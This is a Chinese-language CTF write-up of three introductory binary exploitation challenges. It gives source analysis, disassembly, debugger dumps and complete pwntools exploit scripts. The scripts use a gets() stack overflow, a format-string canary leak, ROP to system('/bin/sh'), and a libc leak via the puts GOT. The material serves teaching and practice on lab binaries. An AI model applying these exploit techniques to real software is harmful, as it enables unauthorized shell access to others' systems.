# Intro_pwn

### 0x1 pwn1

#### 1x0 前置补偿

研究一下`gets()`函数：

函数头：` char *gets(char *string);`

`gets()`函数从流中读取字符串，直到出现换行符或读到文件尾为止，最后加上`NULL`作为字符串结束。所读取的字符串暂存在给定的参数`string`中。

```c
//gcc 2.c -o 2 -fno-stack-protector
#include <stdio.h>
#include <stdlib.h>

int main()
{
  char a[100];
  gets(a);
  printf("%s\n", a);
  for(int i = 0; i<50; i++)
    printf("%c", a[i]);
  return 0;
}
```

```shell
➜  ~ python -c "print 'aaaa\x00bbbbb'" | ./2
aaaa
aaaabbbbbn�JQn�h�[&����#
```

可以看到`gets`并不把`\x00`作为`NULL`。

#### 1x1 源码分析

安全性：

```shell
[*] './pwn1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

没有开CANARY保护，地址也是固定的。

```c
void main(int argc, char* argv[]) {
	ignore_me_init_buffering();	//关闭缓存区
	ignore_me_init_signal();	//计时函数

    welcome();
    AAAAAAAA();
}
```

直接来到`welcome()`。

```c
void welcome() {
    char read_buf[0xff];
    printf("Enter your witch name:\n");
    gets(read_buf);
    printf("┌───────────────────────┐\n");
    printf("│ You are a Hufflepuff! │\n");
    printf("└───────────────────────┘\n");
    printf(read_buf);
}
```

`gets()`函数不限制输入长度，可以直接栈溢出。

`AAAAAAAA()`

```c
void AAAAAAAA() {
    char read_buf[0xff];
    
    printf(" enter your magic spell:\n");
    gets(read_buf);
    if(strcmp(read_buf, "Expelliarmus") == 0) {
        printf("~ Protego!\n");
    } else {
        printf("-10 Points for Hufflepuff!\n");
        _exit(0);
    }
}
```

有一个检测。没啥用。

有个`system_call()`函数挺贴心的：

```c
//0x004008d4
void WINgardium_leviosa() {
    printf("┌───────────────────────┐\n");
    printf("│ You are a Slytherin.. │\n");
    printf("└───────────────────────┘\n");
    system("/bin/sh");
}
```

所以可以直接栈溢出到这个函数来拿到`shell`。

所以详细看一下`welcome()`

```assembly
            ; CALL XREF from main @ 0x4009ec
┌ 94: sym.welcome ();
│           ; var char *format @ rbp-0x100
│           0x00400903      55             push rbp
│           0x00400904      4889e5         mov rbp, rsp
│           0x00400907      4881ec000100.  sub rsp, 0x100
│           0x0040090e      bf7c0b4000     mov edi, str.Enter_your_witch_name: ; 0x400b7c ; "Enter your witch name:" ; const char *s
│           0x00400913      e878fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400918      488d8500ffff.  lea rax, [format]
│           0x0040091f      4889c7         mov rdi, rax                ; char *s
│           0x00400922      b800000000     mov eax, 0
│           0x00400927      e8d4fdffff     call sym.imp.gets           ; char *gets(char *s)
│           0x0040092c      bfb80a4000     mov edi, 0x400ab8           ; const char *s
│           0x00400931      e85afdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400936      bf930b4000     mov edi, str.You_are_a_Hufflepuff ; 0x400b93 ; const char *s
│           0x0040093b      e850fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400940      bf280b4000     mov edi, str.               ; 0x400b28 ; const char *s
│           0x00400945      e846fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040094a      488d8500ffff.  lea rax, [format]
│           0x00400951      4889c7         mov rdi, rax                ; const char *format
│           0x00400954      b800000000     mov eax, 0
│           0x00400959      e852fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040095e      90             nop
│           0x0040095f      c9             leave
└           0x00400960      c3             ret
```

从`var char *format @ rbp-0x100`看到了`format`的位置。

构造`payload = 'a'*0x100 + p64(old_rbp) + p64(ret)`就可以拿到`shell`

#### 1x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./pwn1')

win_addr = 0x004008d4
payload = 'a' * 0x100 + p64(0xdeadbeaf) + p64(win_addr)
p.sendlineafter('Enter your witch name:', payload)
p.interactive()
```

### 0x2 pwn2

#### 2x1 分析

安全性：

```shell
➜  pwn2 checksec pwn2
[*] '~/intro_pwn/pwn2/pwn2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

比上一道题多了一个CANARY

但是代码变化不大。

```c
void main(int argc, char* argv[]) {
	  ignore_me_init_buffering();
	  ignore_me_init_signal();

    check_password_stage1();

    welcome();
    AAAAAAAA();
}
```

`check_password_stage1();`输入密码直接越过就好。

`welcome()`：

```c
void welcome() {
    char read_buf[0xff];
    printf("Enter your witch name:\n");
    gets(read_buf);
    printf("┌───────────────────────┐\n");
    printf("│ You are a Ravenclaw!  │\n");
    printf("└───────────────────────┘\n");
    printf(read_buf);
}
```

这里有一个格式化字符串漏洞。可以考虑覆盖内存还是泄漏内存。还有一个`gets()`在前面。

接下来是

```c
void AAAAAAAA() {
    char read_buf[0xff];
    printf(" enter your magic spell:\n");
    gets(read_buf);
    if(strcmp(read_buf, "Expelliarmus") == 0) {
        printf("~ Protego!\n");
    } else {
        printf("-10 Points for Ravenclaw!\n");
        _exit(0);
    }
}
```

一个`gets()`漏洞。

所以可以通过格式化字符串漏洞来泄漏`CANARY`。

然后在`AAAAAAAA()`中栈溢出到`system("/bin/sh")`。拿到shell。

经过调试

```shell
pwndbg> stack 50
00:0000│ rdi rsp  0x7fffffffe370 ◂— 0x4948007024393325 /* '%39$p' */
01:0008│          0x7fffffffe378 ◂— 'S_IS_TEST_FLAG}'
02:0010│          0x7fffffffe380 ◂— 0x7d47414c465f54 /* 'T_FLAG}' */
03:0018│          0x7fffffffe388 ◂— 0x0
... ↓
20:0100│          0x7fffffffe470 ◂— 0x6
21:0108│          0x7fffffffe478 ◂— 0x3bd4dd9de2fe4d00         <===CANARY
22:0110│ rbp      0x7fffffffe480 —▸ 0x7fffffffe4a0 —▸ 0x400ca0 (__libc_csu_init) ◂— push   r15
23:0118│          0x7fffffffe488 —▸ 0x400c8d (main+55) ◂— mov    eax, 0
24:0120│          0x7fffffffe490 —▸ 0x7fffffffe588 —▸ 0x7fffffffe7cf ◂— '/root/pwn/intro_pwn/pwn2/pwn2'
25:0128│          0x7fffffffe498 ◂— 0x100000000
26:0130│          0x7fffffffe4a0 —▸ 0x400ca0 (__libc_csu_init) ◂— push   r15
27:0138│          0x7fffffffe4a8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
28:0140│          0x7fffffffe4b0 ◂— 0x1
29:0148│          0x7fffffffe4b8 —▸ 0x7fffffffe588 —▸ 0x7fffffffe7cf ◂— '/root/pwn/intro_pwn/pwn2/pwn2'
2a:0150│          0x7fffffffe4c0 ◂— 0x1f7ffcca0
2b:0158│          0x7fffffffe4c8 —▸ 0x400c56 (main) ◂— push   rbp
2c:0160│          0x7fffffffe4d0 ◂— 0x0
2d:0168│          0x7fffffffe4d8 ◂— 0x44d5c1636e97e02b
2e:0170│          0x7fffffffe4e0 —▸ 0x400830 (_start) ◂— xor    ebp, ebp
2f:0178│          0x7fffffffe4e8 —▸ 0x7fffffffe580 ◂— 0x1
30:0180│          0x7fffffffe4f0 ◂— 0x0
```

可以计算出CANARY的偏移量`39`。泄漏CANARY。

然后构造`payload`来调用`system()`。但是这里有个坑，就是原本的`WINgardium_leviosa()`并不能使用了。

因为他的地址恰好有了`\x0a`，也就是`\n`。提前在`gets()`里截断了我们的`payload`。

所以我们需要自己构造。具体的看EXP

#### 2x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level = 'debug')

p = process('./pwn2')
elf = ELF('./pwn2')

def debug(p, cmd):
  gdb.attach(p, cmd)
  pause()

pop_rdi_ret = 0x400d03
sh_addr = 0x400e14
system_addr = elf.plt['system']
fmt_payload = '%39$p'
password = 'CSCG{THIS_IS_TEST_FLAG}'

#leak canary
p.sendlineafter('Enter the password of stage 1:', password)
p.sendlineafter('Enter your witch name:', fmt_payload)
p.recvuntil('└───────────────────────┘\n')
canary = eval(p.recvuntil('00'))
print (hex(canary))
pause()

#leak libc
payload = 'Expelliarmus\x00'
payload += 'a' * (0x110 - 0x8 - 13)
payload += p64(canary)
payload += p64(0xdeadbeaf)
payload += p64(pop_rdi_ret)
payload += p64(sh_addr)
payload += p64(system_addr)
p.sendlineafter('enter your magic spell:\n', payload)
# p.recvuntil('~ Protego!\n')
p.interactive()
```

### 0x3 pwn3

#### 3x1 分析

这道题比较`pwn2`没多大变化，只是在`WINgardium_leviosa()`里删掉了`system()`函数，需要我们自己泄漏`libc`来计算。

```c
void WINgardium_leviosa() {
    printf("They has discovered our secret, Nagini.\n");
    printf("It makes us vulnerable.\n");
    printf("We must deploy all our forces now to find them.\n");
    // system("/bin/sh") it's not that easy anymore.
}
```

所以在`pwn2`之前的思路再加上泄漏libc就好了，我这里选择用`puts()`函数来泄漏`puts()`的GOT。

但是在这里还有一个坑，就是在调用`system()`时，有时会因为ASLR的缘故，导致地址上有`\x0a`。多试几次就行。

#### 3x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level = 'debug')

p = process('./pwn3')
elf = ELF('./pwn3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def debug(p, cmd):
  gdb.attach(p, cmd)
  pause()

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400cb3
A_addr = 0x400B7A
fmt_payload = '%39$p'
password = 'CSCG{THIS_IS_TEST_FLAG}'

#leak canary
p.sendlineafter('Enter the password of stage 2:', password)
p.sendlineafter('Enter your witch name:', fmt_payload)
p.recvuntil('└───────────────────────┘\n')
canary = eval(p.recvuntil('00'))
print (hex(canary))
pause()

#leak libc
payload = 'Expelliarmus\x00'
payload += 'a' * (0x110 - 0x8 - 13)
payload += p64(canary)
payload += p64(0xdeadbeaf)
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(A_addr)
p.sendlineafter('enter your magic spell:\n', payload)
p.recvuntil('~ Protego!\n')
puts_addr = u64(p.recv(6).ljust(8, '\x00'))
libc.address = puts_addr - libc.symbols['puts']
system_addr = libc.sym['system']
sh_addr = next(libc.search('/bin/sh\x00'))
print (hex(system_addr), hex(sh_addr))
print (hex(libc.address))
pause()
# debug(p, '\n')

#get_shell
payload = 'Expelliarmus\x00'
payload += 'a' * (0x110 - 0x8 - 13)
payload += p64(canary)
payload += p64(0xdeadbeaf)
payload += p64(pop_rdi_ret)
payload += p64(sh_addr)
payload += p64(system_addr)
p.sendlineafter('enter your magic spell:\n', payload)
p.recvuntil('~ Protego!\n')
p.interactive()
```

